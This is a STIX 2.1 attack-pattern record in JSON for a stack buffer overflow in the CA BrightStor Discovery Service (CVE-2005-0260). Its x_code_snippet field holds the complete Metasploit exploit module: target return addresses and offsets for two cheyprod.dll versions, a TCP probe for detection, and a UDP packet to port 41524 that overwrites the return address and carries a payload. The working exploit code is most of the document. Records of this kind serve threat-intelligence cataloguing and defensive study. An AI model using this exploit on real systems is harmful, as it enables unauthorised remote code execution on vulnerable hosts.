{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad0a6b2e-06e0-4ad8-8717-f4e18ad36ffe",
    "created": "2024-08-14T16:48:22.455782Z",
    "modified": "2024-08-14T16:48:22.455786Z",
    "name": "CA BrightStor Discovery Service Stack Buffer Overflow",
    "description": " This module exploits a vulnerability in the CA BrightStor Discovery Service. This vulnerability occurs when a large request is sent to UDP port 41524, triggering a stack buffer overflow. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/discovery_udp.rb",
            "external_id": "discovery_udp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-0260"
        },
        {
            "source_name": "reference",
            "url": "http://www.idefense.com/application/poi/display?id=194&type=vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor Discovery Service Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in the CA BrightStor\n        Discovery Service. This vulnerability occurs when a large\n        request is sent to UDP port 41524, triggering a stack buffer\n        overflow.\n      },\n      'Author'         => [ 'hdm', 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-0260'],\n          [ 'OSVDB', '13613'],\n          [ 'BID', '12491'],\n          [ 'URL', 'http://www.idefense.com/application/poi/display?id=194&type=vulnerabilities'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'      => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'cheyprod.dll 12/12/2003',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x23808eb0, # call to edi reg\n              'Offset'   => 968,\n            },\n          ],\n          [\n            'cheyprod.dll 07/21/2004',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x2380a908, # call edi\n              'Offset'   => 970,\n            },\n          ],\n        ],\n      'DisclosureDate' => '2004-12-20',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(41524)\n      ])\n  end\n\n  def check\n\n    # The first request should have no reply\n    csock = Rex::Socket::Tcp.create(\n      'PeerHost'  => datastore['RHOST'],\n      'PeerPort'  => 41523,\n      'Context'   =>\n        {\n          'Msf'        => framework,\n          'MsfExploit' => self,\n        })\n\n    csock.put('META')\n    x = csock.get_once(-1, 3)\n    csock.close\n\n    # The second request should be replied with the host name\n    csock = Rex::Socket::Tcp.create(\n      'PeerHost'  => datastore['RHOST'],\n      'PeerPort'  => 41523,\n      'Context'   =>\n        {\n          'Msf'        => framework,\n          'MsfExploit' => self,\n        })\n\n    csock.put('hMETA')\n    y = csock.get_once(-1, 3)\n    csock.close\n\n    if (y and not x)\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect_udp\n\n    print_status(\"Trying target #{target.name}...\")\n\n    buf = rand_text_english(4096)\n\n    # Target 0:\n    #\n    # esp @ 971\n    # ret @ 968\n    # edi @ 1046\n    # end = 4092\n\n    buf[target['Offset'], 4] = [ target.ret ].pack('V')\n    buf[1046, payload.encoded.length] = payload.encoded\n\n    udp_sock.put(buf)\n    udp_sock.recvfrom(8192)\n\n    handler\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-12-20",
    "x_mitre_platforms": [
        "win'"
    ]
}